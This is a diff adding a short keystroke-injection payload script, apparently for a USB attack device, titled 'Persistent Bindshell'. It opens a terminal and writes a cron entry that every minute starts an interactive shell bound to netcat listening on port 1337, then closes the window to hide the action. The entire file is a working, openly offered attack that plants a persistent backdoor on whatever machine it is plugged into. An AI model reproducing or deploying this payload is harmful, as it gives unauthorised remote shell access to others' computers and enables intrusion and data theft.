@@ -1,0 +1,16 @@
+REM Title: Persistent Bindshell
+REM Author: UndedInside
+REM Description: Uses cron to create a persistent bindshell
+
+DEFAULT_DELAY 500
+
+REM Open terminal:
+GUI SPACE
+STRING terminal
+ENTER
+
+STRING (crontab -l 2>/dev/null; echo "* * * * * rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1337 > /tmp/f") | crontab -
+ENTER
+GUI w
+
+
